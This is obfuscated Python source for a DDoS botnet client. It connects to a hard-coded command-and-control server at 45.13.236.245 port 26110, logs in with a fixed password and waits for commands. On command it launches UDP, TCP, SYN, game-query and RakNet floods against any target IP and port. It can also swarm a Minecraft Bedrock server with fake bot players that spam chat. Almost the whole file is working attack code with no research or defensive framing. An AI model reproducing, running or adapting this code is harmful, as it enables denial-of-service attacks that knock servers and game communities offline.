Al='HANDSHAKING'
Ak='intervalo'
Aj='Standard_Custom'
Ai='replace'
Ah=b'\x00\x00'
Ag=isinstance
AN='register_sent'
AM='entity_id'
AL='split_id'
AK='order_index'
AJ='msg_index'
AI='send_seq'
AH=b'\x00'
AG=bytearray
A9='CONNECTING_1'
A8='mtu_idx'
A7='spawn_fallback'
A6='resource_pack_done'
A5='mensajes'
A4='yaw'
A3='chunk'
A2='text'
A1='move'
A0='nombre'
v='ack_queue'
u='register_cmd'
t='z'
s='y'
r='x'
q='mtu_size'
p='port'
o='host'
n='.'
m=Exception
i='use_variant_a'
h='sent_frames'
e='req2_retry_t'
d='split_map'
c='spawned'
b='client_id'
Y=''
W=print
U='mtu_retry_t'
T='proto'
S='pos'
R='utf-8'
Q=bytes
P='sock'
N='phase'
L=False
K=range
I=None
G=int
F=True
E='is_closing'
D=len
import subprocess as AO,random as B,os as f,time as C,threading as O,socket as A,sys,struct as M,zlib as w,json,base64 as j,math,string as AP,signal,hashlib
from cryptography.hazmat.primitives.asymmetric import ec
from cryptography.hazmat.primitives import serialization as AQ,hashes
from cryptography.hazmat.backends import default_backend as Am
AR='45.13.236.245'
AS=26110
AT=5
g={}
Z=[]
AA=O.Lock()
H=L
An=b'\xff\xff\xff\xffgetinfo xxx\x00\x00\x00'
Ao=b'\xff\xff\xff\xffTSource Engine Query\x00'
Ap=b'atom data ontop my own ass amp/triphent is my dick and balls'
Aq=b'UUUU\x00\x00\x00\x01'
BX=AH*1024
Ar=[1024,2048]
As=1400
def At():
	try:
		A=f.cpu_count()
		if A and A>0:return A*2
	except:pass
	return 4
def Au(ip,port,secs,stop_event,num_threads=1):
	J=stop_event;L=secs;M=G(C.time())^f.getpid();E=[]
	for N in K(num_threads*10):
		try:
			D=A.socket(A.AF_INET,A.SOCK_STREAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D.settimeout(.1)
			try:D.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1)
			except:pass
			try:H=12;D.setsockopt(A.IPPROTO_TCP,H,1)
			except:pass
			E.append(D)
		except:pass
	if not E:
		try:D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(.1);E.append(D)
		except:pass
	O=ip,port
	while C.time()<L:
		if J.is_set():break
		for D in E[:]:
			try:
				D.connect(O);B.seed(M+G(C.time()*1000)%1000000);P=Q([B.randint(0,255)for A in K(As)])
				for N in K(50):
					if C.time()>=L or J.is_set():break
					try:
						R=D.send(P)
						if R<=0:break
					except(A.error,BrokenPipeError):break
				try:D.close()
				except:pass
				F=A.socket(A.AF_INET,A.SOCK_STREAM);F.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);F.settimeout(.1)
				try:F.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1)
				except:pass
				try:H=12;F.setsockopt(A.IPPROTO_TCP,H,1)
				except:pass
				I=E.index(D);E[I]=F
			except(A.error,A.timeout,ConnectionRefusedError):
				try:D.close()
				except:pass
				try:
					F=A.socket(A.AF_INET,A.SOCK_STREAM);F.settimeout(.1)
					try:F.setsockopt(A.IPPROTO_TCP,A.TCP_NODELAY,1)
					except:pass
					I=E.index(D);E[I]=F
				except:pass
				continue
			except:continue
	for D in E:
		try:D.close()
		except:pass
def Av(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);B.connect((ip,port))
		while C.time()<secs:
			if stop_event.is_set():break
			for D in K(50):
				try:B.send(b'')
				except:pass
		B.close()
	except:pass
def AU(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(B.choice(Ar))
			try:D.sendto(E,(ip,port))
			except:pass
	except:pass
def Aw(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(B.choice([512,1024,2048]))
			for F in K(5):
				try:D.sendto(E,(ip,port))
				except:pass
	except:pass
def Ax(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(65000)
			try:D.sendto(E[:B.randint(1000,65000)],(ip,port))
			except:pass
	except:pass
def Ay(ip,port,secs,stop_event):
	try:
		E=[]
		for F in K(10):
			try:D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E.append(D)
			except:pass
		while C.time()<secs:
			if stop_event.is_set():break
			for D in E:
				try:
					for F in K(50):G=B._urandom(1400);D.sendto(G,(ip,port))
				except:pass
		for D in E:
			try:D.close()
			except:pass
	except:pass
def Az(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			E=B._urandom(B.choice([512,780,1024,1032]))
			try:D.sendto(E,(ip,port))
			except:pass
	except:pass
def A_(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D=b'\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(D,(ip,port))
			except:pass
	except:pass
def B0(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);D=b'\x01'+AH*23+Ah
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(D,(ip,port))
			except:pass
	except:pass
def BY(ip,port,secs,stop_event):
	E=stop_event
	while C.time()<secs:
		if E.is_set():break
		try:
			D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(2);D.connect((ip,port));F=B._urandom(1024);G=C.time()
			while C.time()-G<2 and not E.is_set():
				try:D.send(F)
				except:break
			D.close()
		except:pass
def AV(ip,port,secs,stop_event):
	while C.time()<secs:
		if stop_event.is_set():break
		try:
			D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(3);D.connect((ip,port));E=B._urandom(65000)
			for F in K(10):
				try:D.send(E[:1400])
				except:break
			D.close()
		except:pass
def B1(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E=B._urandom(65000)
		while C.time()<secs:
			if stop_event.is_set():break
			try:D.sendto(E,(ip,port))
			except:pass
	except:pass
def B2(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E=[AH,b'\x01',b'\xff',b'\x16',b'\x13',b'\x03',b'G',b'P',b'H',b'O',Ah,b'\x01\x00',b'\xff\xff',b'\x80\x00',B._urandom(1),B._urandom(2)]
		while C.time()<secs:
			if stop_event.is_set():break
			for G in K(100):
				F=B.choice(E)
				try:D.sendto(F,(ip,port))
				except:pass
			C.sleep(.001)
		D.close()
	except:pass
def B3(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(Aq,(ip,port))
			except:pass
	except:pass
def B4(ip,port,secs,stop_event):
	try:
		D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1);E=[b'\xde\xad\xbe\xef\xc0\xff\xee\x00',b'\xba\xad\xf0\r\r\x15\xea^',b'\xfa\xce\xb0\x0c\xca\xfe\xba\xbe',b'\xde\xad\xc0\xde\xf0\r\xba\xbe',b'\x00\x11"3DUfw',b'\x88\x99\xaa\xbb\xcc\xdd\xee\xff',b'\x01#Eg\x89\xab\xcd\xef',b'\xfe\xdc\xba\x98vT2\x10']
		while C.time()<secs:
			if stop_event.is_set():break
			F=B.choice(E)*B.randint(10,100)
			try:D.sendto(F,(ip,port))
			except:pass
	except:pass
def B5(ip,port,secs,stop_event):
	while C.time()<secs:
		if stop_event.is_set():break
		try:B=A.socket(A.AF_INET,A.SOCK_STREAM);B.settimeout(1);B.connect((ip,port));B.send(f.urandom(1024));B.close()
		except:pass
def B6(ip,port,secs,stop_event):
	while C.time()<secs:
		if stop_event.is_set():break
		try:
			if B.choice([F,L]):D=A.socket(A.AF_INET,A.SOCK_STREAM);D.settimeout(2);D.connect((ip,port));D.send(B._urandom(1024));D.close()
			else:D=A.socket(A.AF_INET,A.SOCK_DGRAM);D.sendto(B._urandom(1024),(ip,port))
		except:pass
def B7(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(Ap,(ip,port))
			except:pass
	except:pass
def B8(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(An,(ip,port))
			except:pass
	except:pass
def B9(ip,port,secs,stop_event):
	try:
		B=A.socket(A.AF_INET,A.SOCK_DGRAM);B.setsockopt(A.SOL_SOCKET,A.SO_REUSEADDR,1)
		while C.time()<secs:
			if stop_event.is_set():break
			try:B.sendto(Ao,(ip,port))
			except:pass
	except:pass
def BA():
	try:A=AO.check_output(['uname','-m'],stderr=AO.DEVNULL);return A.decode().strip()
	except:return'unknown'
def BZ(length=4,chara='\n\r'):return Y.join(B.choice(chara)for A in K(length))
def BB(method,ip,port,secs,stop_event,threads):
	D='.TCP';C=stop_event;A=method;B={'.HEX':B3,'.STDHEX':B4,'.UDP':AU,'.UDPFRAG':Ax,'.UDPGAME':Az,'.UDPPPS':Av,'.UDPQUERY':A_,'.UDPBYPASS':AU,'.UDPBYPASSV2':Aw,'.UDPKILL':Ay,D:Au,'.TCPOVH':AV,'.MIX':B6,'.SYN':B5,'.VSE':B9,'.MCPE':B7,'.FIVEM':B8,'.RAKNET':B0,'.OVHUDP':B1,'.OVHTCP':AV,'.OVHPPS':B2}
	if A in B:
		if A==D:E=At();B[A](ip,port,secs,C,E)
		else:B[A](ip,port,secs,C)
def BC(method,ip,port,duration,thread_count,username):
	B=thread_count;A=username;D=O.Event();G=C.time()+duration
	for H in K(B):
		E=O.Thread(target=BB,args=(method,ip,port,G,D,B),daemon=F);E.start()
		if A not in g:g[A]=[]
		g[A].append((E,D))
def BD(username):
	A=username
	if A in g:
		for(C,B)in g[A]:B.set()
		g[A].clear()
AW=AP.ascii_lowercase+AP.digits
BE=Q([0,255,255,0,254,254,254,254,253,253,253,253,18,52,86,120])
x=[1492,1464,1400,1200,576]
try:k=ec.generate_private_key(ec.SECP384R1(),Am())
except m:k=I
def AX():
	if k is I:return'AAAA'
	return j.b64encode(k.public_key().public_bytes(AQ.Encoding.DER,AQ.PublicFormat.SubjectPublicKeyInfo)).decode(R)
def AY(data):
	A=data
	if Ag(A,(dict,list)):A=json.dumps(A,separators=(',',':')).encode(R)
	elif Ag(A,str):A=A.encode(R)
	return j.urlsafe_b64encode(A).rstrip(b'=').decode(R)
def BF(der):B=der;A=2;F=B[A+1];A+=2;C=B[A:A+F];A+=F;K=B[A+1];A+=2;E=B[A:A+K];G=AG(48);H=AG(48);I=C[1:]if C[0]==0 else C;J=E[1:]if E[0]==0 else E;G[48-D(I):]=I;H[48-D(J):]=J;return Q(G)+Q(H)
def AZ(payload):
	B=AX();A=AY({'alg':'ES384','x5u':B})+n+AY(payload)
	if k is I:return A+n
	try:C=k.sign(A.encode(R),ec.ECDSA(hashes.SHA384()));return A+n+j.urlsafe_b64encode(BF(C)).rstrip(b'=').decode(R)
	except m:return A+n
class J:
	def __init__(A):A.parts=[]
	def u8(A,v):A.parts.append(M.pack('B',v&255));return A
	def u16be(A,v):A.parts.append(M.pack('>H',v&65535));return A
	def i32be(A,v):A.parts.append(M.pack('>i',v));return A
	def u32be(A,v):A.parts.append(M.pack('>I',v&4294967295));return A
	def i32le(A,v):A.parts.append(M.pack('<i',v));return A
	def i64be(A,v):A.parts.append(M.pack('>q',v));return A
	def u64be(A,v):A.parts.append(M.pack('>Q',v&0xffffffffffffffff));return A
	def f32be(A,v):A.parts.append(M.pack('>f',v));return A
	def t_le(A,v):A.parts.append(Q([v&255,v>>8&255,v>>16&255]));return A
	def raw(A,b):A.parts.append(Q(b));return A
	def magic(A):A.parts.append(BE);return A
	def str_(A,s):B=s.encode(R);A.u16be(D(B));A.parts.append(B);return A
	def str_raw(A,b):b=Q(b);A.u16be(D(b));A.parts.append(b);return A
	def rak_ip(A,ip,port):
		A.u8(4)
		for B in ip.split(n):A.u8(~G(B)&255)
		A.u16be(port);return A
	def buf(A):return b''.join(A.parts)
class a:
	def __init__(A,b):A.b=Q(b);A.p=0
	def left(A):return D(A.b)-A.p
	def u8(A):B=A.b[A.p];A.p+=1;return B
	def u16be(A):B=M.unpack_from('>H',A.b,A.p)[0];A.p+=2;return B
	def i32be(A):B=M.unpack_from('>i',A.b,A.p)[0];A.p+=4;return B
	def u32be(A):B=M.unpack_from('>I',A.b,A.p)[0];A.p+=4;return B
	def i64be(A):B=M.unpack_from('>q',A.b,A.p)[0];A.p+=8;return B
	def u64be(A):B=M.unpack_from('>Q',A.b,A.p)[0];A.p+=8;return B
	def f32be(A):B=M.unpack_from('>f',A.b,A.p)[0];A.p+=4;return B
	def t_le(A):B=A.b[A.p]|A.b[A.p+1]<<8|A.b[A.p+2]<<16;A.p+=3;return B
	def bytes_(A,n):B=A.b[A.p:A.p+n];A.p+=n;return B
	def skip(A,n):A.p+=n;return A
	def str_(A):B=A.u16be();return A.bytes_(B).decode(R,errors=Ai)
def BG(base):return f"{base}_{Y.join(B.choices(AW,k=6))}"
def BH():return Y.join(B.choices(AW,k=8))
def BI():
	D=AG(8192)
	def A(x0,y0,x1,y1,r,g,b,a=255):
		for B in K(y0,y1):
			for C in K(x0,x1):A=(B*64+C)*4;D[A]=r;D[A+1]=g;D[A+2]=b;D[A+3]=a
	def E(x,y,r,g,b):A=(y*64+x)*4;D[A]=r;D[A+1]=g;D[A+2]=b;D[A+3]=255
	B=198,134,66;G=92,56,35;C=67,95,175;F=53,85,105;H=38,38,38;A(8,0,16,8,*G);A(16,0,24,8,*B);A(0,8,8,16,*B);A(8,8,16,16,*B);A(16,8,24,16,*G);A(24,8,32,16,*G);A(8,0,16,4,*G);A(9,9,11,11,255,255,255);E(9,10,33,18,7);A(13,9,15,11,255,255,255);E(14,10,33,18,7);E(11,11,*B);E(12,11,*B);E(11,12,140,80,30);E(12,12,140,80,30);A(10,13,14,14,140,60,20);A(20,16,28,20,*C);A(28,16,36,20,*C);A(16,20,20,32,*C);A(20,20,28,32,*C);A(28,20,32,32,*C);A(32,20,40,32,*C);A(23,20,25,32,50,75,155);A(44,16,48,20,*B);A(48,16,52,20,*B);A(40,20,44,32,*B);A(44,20,48,32,*B);A(48,20,52,32,*B);A(52,20,56,32,*B);A(44,20,48,24,*C);A(40,20,44,24,*C);A(48,20,52,24,*C);A(52,20,56,24,*C);A(4,16,8,20,*F);A(8,16,12,20,*F);A(0,20,4,32,*F);A(4,20,8,32,*F);A(8,20,12,32,*F);A(12,20,16,32,*F);A(0,28,4,32,*H);A(4,28,8,32,*H);A(8,28,12,32,*H);A(12,28,16,32,*H);return j.b64encode(Q(D)).decode(R)
Aa=BI()
def BJ(bot):A=bot;I=AX();K='00000000-0000-4000-8000-'+f.urandom(6).hex();B=G(C.time());L=AZ({'extraData':{'displayName':A[A0],'identity':K,'XUID':Y},'identityPublicKey':I,'nbf':B-60,'exp':B+86400});M=AZ({'ClientRandomId':A[b]&4294967295,'ServerAddress':f"{A[o]}:{A[p]}",'SkinData':Aa,'SkinId':Aj,'CapeData':Y,'SkinGeometryName':'geometry.humanoid.custom','SkinGeometry':Y,'DeviceOS':1,'GameVersion':'0.15.10'});E=json.dumps({'chain':[L]}).encode(R);F=M.encode(R);N=J().i32le(D(E)).raw(E).i32le(D(F)).raw(F).buf();H=w.compress(N,level=7);return Q([254,1])+J().i32be(84).i32be(D(H)).raw(H).buf()
def BK(bot):A=bot;B=j.b64decode(Aa);return J().u8(143).str_(A[A0]).i32be(70).i32be(70).u64be(A[b]).raw(f.urandom(16)).str_(f"{A[o]}:{A[p]}").str_(Y).str_(Aj).str_raw(B).u8(0).buf()
def BL(pkts,bot):
	B=b''.join(M.pack('>I',D(A))+A for A in pkts);A=w.compress(B,level=7)
	if bot[T]>=84:return Q([254,6])+J().i32be(D(A)).raw(A).buf()
	return J().u8(146).i32be(D(A)).raw(A).buf()
BM=1024
def X(bot,buf):
	A=bot
	if A[P]is I:return
	try:A[P].sendto(buf,(A[o],A[p]))
	except:pass
def l(bot,payload,is_split,split_count,split_id,split_idx):
	F=is_split;C=payload;A=bot
	if A[P]is I or A[E]or H:return
	G=A[AI];A[AI]+=1;B=J().u8(132).t_le(G);B.u8(112 if F else 96);B.u16be(D(C)*8);L=A[AJ];A[AJ]+=1;M=A[AK];A[AK]+=1;B.t_le(L).t_le(M).u8(0)
	if F:B.u32be(split_count).u16be(split_id).u32be(split_idx)
	B.raw(C);K=B.buf();A[h][G]=K
	if D(A[h])>BM:del A[h][next(iter(A[h]))]
	X(A,K)
def Ab(bot,payload):
	B=payload;A=bot
	if A[P]is I or A[E]or H:return
	C=(A[q]or 1464)-60
	if D(B)<=C:l(A,B,L,0,0,0);return
	M=A[AL]&65535;A[AL]+=1;J=math.ceil(D(B)/C)
	for G in K(J):l(A,B[G*C:(G+1)*C],F,J,M,G)
def V(bot,pkt):
	A=bot
	if A[P]is I or A[E]or H:return
	Ab(A,BL([pkt],A))
def AB(bot):
	if bot[T]<84:return{A1:157,A2:147,A3:201}
	if bot[i]:return{A1:16,A2:7,A3:61}
	return{A1:19,A2:9,A3:69}
def y(bot):return J().u8(AB(bot)[A3]).i32be(8).buf()
def BN(bot):B=bot;A=B[S];return J().u8(AB(B)[A1]).i64be(B[AM]).f32be(A[r]).f32be(A[s]).f32be(A[t]).f32be(A[A4]).f32be(A[A4]).f32be(A['pitch']).u8(0).u8(1).buf()
def Ac(bot,msg):return J().u8(AB(bot)[A2]).u8(1).str_(bot[A0]).str_(msg).buf()
def Ad(bot,status):A=8 if bot[i]else 8;return J().u8(A).u8(status).u16be(0).buf()
def Ae(bot,status):
	A=bot
	if status==3 and not A[c]:A[c]=F;V(A,y(A));BO(A);BQ(A);BP(A)
def BO(bot):
	A=bot
	if A[AN]or not A[u]:return
	A[AN]=F
	if A[u].startswith('/'):B=f"{A[u]} {BH()}"
	else:B=A[u]
	V(A,Ac(A,B))
def BP(bot):
	A=bot
	def B():
		B=0
		while not A[E]and not H and A[c]:
			if A[A5]:F=A[A5][B%D(A[A5])];V(A,Ac(A,F));B+=1
			C.sleep(A[Ak])
	O.Thread(target=B,daemon=F).start()
def BQ(bot):
	A=bot
	def D():
		D,F,G=A[S][r],A[S][s],A[S][t]
		while not A[E]and not H and A[c]:A[S][r]=D+B.uniform(-5,5);A[S][t]=G+B.uniform(-5,5);A[S][s]=F+B.uniform(-.5,.5);A[S][A4]=B.uniform(0,360);V(A,BN(A));C.sleep(.5)
	O.Thread(target=D,daemon=F).start()
def z(bot,data):
	G=data;A=bot
	if not G or A[E]:return
	C=G[0];B=a(G);B.skip(1)
	if C==144 or C==2:
		D=B.i32be()
		if D==0:V(A,y(A))
		elif D in(1,2):AE(A)
		elif D==3:Ae(A,D)
		return
	if C==6 and A[T]>=84 and not A[A6]and not A[i]:V(A,Ad(A,3));return
	if C==7 and A[T]>=84 and not A[A6]and not A[i]:A[A6]=F;V(A,Ad(A,4));return
	if C==3 and A[T]>=84:V(A,J().u8(4).buf());V(A,y(A));return
	if C in(149,9,11,17):
		if A[T]>=84:A[i]=C==9
		try:B.i32be();B.u8();B.i32be();B.i32be();A[AM]=B.i64be();B.i32be();B.i32be();B.i32be();A[S][r]=B.f32be();A[S][s]=B.f32be();A[S][t]=B.f32be()
		except:pass
		V(A,y(A))
		if A[A7]is I:
			def L():
				if not A[c]and not A[E]and not H:Ae(A,3)
			K=O.Timer(1e1,L);K.daemon=F;K.start();A[A7]=K
		return
	if C in(145,5):AE(A);return
def AC(bot,payload):
	C=bot
	if C[E]:return
	try:
		F=a(payload);J=F.i32be();H=F.bytes_(min(J,F.left()))
		try:I=w.decompress(H)
		except:I=w.decompress(H,-15)
		A=a(I)
		while A.left()>=4:
			G=A.u32be()
			if G==0 or G>A.left():break
			B=A.bytes_(G)
			if B[0]==254 and D(B)>1:z(C,B[1:])
			else:z(C,B)
	except:pass
def Af(bot,payload):
	B=bot;A=payload
	if not A or B[E]:return
	F=A[0]
	if F==0:
		if D(A)>=9:H=M.unpack_from('>q',A,1)[0];l(B,J().u8(3).i64be(H).i64be(G(C.time()*1000)).buf(),L,0,0,0)
		return
	if F==21:AE(B);return
	if F==16:BS(B,A);return
	if F==254:
		if D(A)<2:return
		if A[1]==6:AC(B,A[2:])
		else:z(B,A[1:])
		return
	if F==146:AC(B,A[1:]);return
	if F==6 and B[T]>=84:AC(B,A[1:]);return
	z(B,A)
def BR(bot,msg):
	B=bot
	if B[E]:return
	A=a(msg);A.skip(1);L=A.t_le();B[v].append(L)
	while A.left()>0:
		try:
			D=A.u8();F=D>>5&7;G=D>>4&1;M=A.u16be();N=math.ceil(M/8)
			if F in(2,3,4,6,7):A.t_le()
			if F in(1,3,4):A.t_le();A.u8()
			H=C=J=0
			if G:H=A.u32be();C=A.u16be();J=A.u32be()
			K=A.bytes_(N)
			if G:
				if C not in B[d]:B[d][C]=[I]*H
				B[d][C][J]=K
				if all(A is not I for A in B[d][C]):Af(B,b''.join(B[d][C]));del B[d][C]
			else:Af(B,K)
		except:break
def BS(bot,payload):
	A=bot
	if A[E]:return
	B=a(payload);B.skip(1);F=0
	try:
		I=B.u8();B.skip(6 if I==4 else 18);B.skip(2)
		for M in K(10):P=B.u8();B.skip(6 if P==4 else 18)
		F=B.i64be()
	except:pass
	D=J().u8(19).rak_ip(A[o],A[p])
	for M in K(10):D.u8(4).u8(128).u8(255).u8(255).u8(254).u16be(0)
	D.i64be(F).i64be(G(C.time()*1000));l(A,D.buf(),L,0,0,0)
	if A[N]==Al:
		A[N]='LOGIN'
		def Q():
			if H or A[E]:return
			Ab(A,BJ(A)if A[T]>=84 else BK(A))
		O.Timer(.1,Q).start()
def AD(bot):
	A=bot
	if A[P]is I or A[E]or H:return
	B=x[A[A8]%D(x)];A[q]=B;C=max(0,B-28-1-16-1);X(A,J().u8(5).magic().u8(7).raw(Q(C)).buf())
def AE(bot):
	A=bot
	if A[E]:return
	A[E]=F;A[c]=L
	for B in(A7,U,e):
		C=A.get(B)
		if C:C.cancel();A[B]=I
	D=A[P];A[P]=I
	if D:
		try:D.close()
		except:pass
def AF(bot):
	A=bot
	if A[U]:A[U].cancel()
	def C():
		if A[N]!=A9 or A[E]or H:return
		A[A8]=(A[A8]+1)%D(x);AD(A);AF(A)
	B=O.Timer(3.,C);B.daemon=F;B.start();A[U]=B
def BT(host,port,nombre,register_cmd,mensajes,intervalo):
	j='UNCONNECTED';B={o:host,p:port,A0:BG(nombre),u:register_cmd,A5:mensajes,Ak:intervalo,b:G.from_bytes(f.urandom(8),'big'),q:x[0],AI:0,AJ:0,AK:0,AL:0,AM:0,S:{r:0,s:64,t:0,A4:0,'pitch':0},c:L,E:L,P:I,AN:L,N:j,A8:0,T:70,i:L,A6:L,v:[],d:{},h:{},A7:I,U:I,e:I};g=A.socket(A.AF_INET,A.SOCK_DGRAM);g.setblocking(L);g.bind((Y,0));B[P]=g;X(B,J().u8(1).i64be(G(C.time()*1000)).magic().u64be(B[b]).buf())
	def V():
		n='_req2flip';m='CONNECTING_2'
		while not B[E]and not H:
			try:A,u=g.recvfrom(65535)
			except BlockingIOError:C.sleep(.001);continue
			except:break
			if not A:continue
			W=A[0]
			if W==192:continue
			if W==160:
				try:
					Z=a(A);Z.skip(1);w=Z.u16be()
					for u in K(w):
						x=Z.u8();Q=Z.t_le();V=Q if x else Z.t_le()
						for y in K(Q,V+1):
							o=B[h].get(y)
							if o and B[P]and not B[E]:X(B,o)
				except:pass
				continue
			if 128<=W<=143:
				BR(B,A)
				if B[v]and not B[E]:
					Y=sorted(set(B[v]));c=[];S=0
					while S<D(Y):
						Q=V=Y[S]
						while S+1<D(Y)and Y[S+1]==Y[S]+1:S+=1;V=Y[S]
						c.append((Q,V));S+=1
					d=J().u8(192).u16be(D(c))
					for(Q,V)in c:d.u8(1).t_le(Q)if Q==V else d.u8(0).t_le(Q).t_le(V)
					X(B,d.buf());B[v]=[]
				continue
			if W==6 and B[N]==A9:
				if D(A)>=2:p=M.unpack_from('>H',A,D(A)-2)[0];B[q]=p if 576<=p<=1500 else 1400
				B[N]=m
				if B[U]:B[U].cancel();B[U]=I
				r=J().u8(7).magic().rak_ip(host,port).u16be(B[q]).u64be(B[b]).buf();X(B,r);B[n]=L
				def s():
					if B[N]!=m or B[E]:return
					B[n]=not B[n];X(B,r);A=O.Timer(2.,s);A.daemon=F;A.start();B[e]=A
				f=O.Timer(2.,s);f.daemon=F;f.start();B[e]=f;continue
			if W==8 and B[N]==m:
				if B[e]:B[e].cancel();B[e]=I
				B[N]=Al;l(B,J().u8(9).u64be(B[b]).i64be(G(C.time()*1000)).u8(0).buf(),L,0,0,0);continue
			if W==28 and B[N]==j:
				try:
					i=a(A);i.skip(33);z=i.bytes_(i.u16be()).decode(R,errors=Ai);k=z.split(';')
					if D(k)>=3 and k[2].isdigit():
						t=G(k[2])
						if t>0:B[T]=t
				except:pass
				if B[U]:B[U].cancel();B[U]=I
				B[N]=A9;AD(B);AF(B);continue
	O.Thread(target=V,daemon=F).start();Q=[0]
	def W():
		while B[N]==j and not B[E]and not H:
			C.sleep(.5);Q[0]+=1
			if Q[0]>=4:
				if B[N]==j:B[T]=70;B[N]=A9;AD(B);AF(B)
				return
			X(B,J().u8(1).i64be(G(C.time()*1000)).magic().u64be(B[b]).buf())
	O.Thread(target=W,daemon=F).start();return B
def BU(host,port,nombre,cantidad,tiempo,register_cmd,mensajes_raw,intervalo):
	M=mensajes_raw;J=nombre;I=intervalo;B=cantidad;A=tiempo;global Z,H
	try:
		B=G(B);A=G(A);I=G(I);N=[A.strip().replace('-',' ')for A in M.split('|')if A.strip()]if M else['Hola!'];W(f"[MCBot] Iniciando ataque a {host}:{port}");W(f"[MCBot] Bots: {B}, Tiempo: {A}s, Nombre: {J}")
		for Q in K(B):
			if H:break
			D=BT(host,port,J,register_cmd,N,I)
			with AA:Z.append(D)
			C.sleep(.3)
		if A>0:
			C.sleep(A);H=F
			with AA:
				for D in Z[:]:
					D[E]=F
					try:D[P].close()
					except:pass
				Z.clear()
			H=L
		return F
	except m as O:W(f"[MCBot] Error: {O}");return L
def BV():
	global Z,H;H=F
	with AA:
		for A in Z[:]:
			A[E]=F
			try:A[P].close()
			except:pass
		Z.clear()
def BW():
	P='MCBOT';global H
	while F:
		try:
			E=A.socket(A.AF_INET,A.SOCK_STREAM);E.setsockopt(A.SOL_SOCKET,A.SO_KEEPALIVE,1);E.settimeout(10);W(f"[*] Conectando a {AR}:{AS}...");E.connect((AR,AS));W('[+] Conectado!');I=0
			while I<2:
				try:
					J=E.recv(1024).decode()
					if'Username'in J:E.send(BA().encode());I=1
					elif'Password'in J and I==1:E.send('ÿÿÿÿ='.encode('cp1252'));I=2
				except A.timeout:continue
				except:break
			if I<2:raise m('Auth failed')
			W('✅ Autenticado!')
			while F:
				try:
					J=E.recv(1024).decode().strip()
					if not J:continue
					B=J.split(' ');M=B[0].upper()
					if M=='PING':E.send('PONG'.encode())
					elif M=='STOP'and D(B)>1:
						K=B[1];BD(K)
						if K==P or P in K:BV();H=L
					elif M=='.MCBOT':
						if D(B)>=9:Q=B[1];N=G(B[2]);R=B[3];S=G(B[4]);T=G(B[5]);U=B[6];V=B[7];X=G(B[8]);H=L;O.Thread(target=BU,args=(Q,N,R,S,T,U,V,X),daemon=F).start()
					elif D(B)>=4:Y=M;Z=B[1];N=G(B[2]);a=G(B[3]);b=G(B[4])if D(B)>=5 else 1;K=B[5]if D(B)>=6 else'default';BC(Y,Z,N,a,b,K)
				except A.timeout:continue
				except:break
			E.close()
		except m as c:W(f"❌ Error: {c}")
		W(f"[*] Reintentando en {AT} segundos...");C.sleep(AT)
if __name__=='__main__':
	try:BW()
	except KeyboardInterrupt:W('\n🛑 Detenido');sys.exit(0)
	except:pass
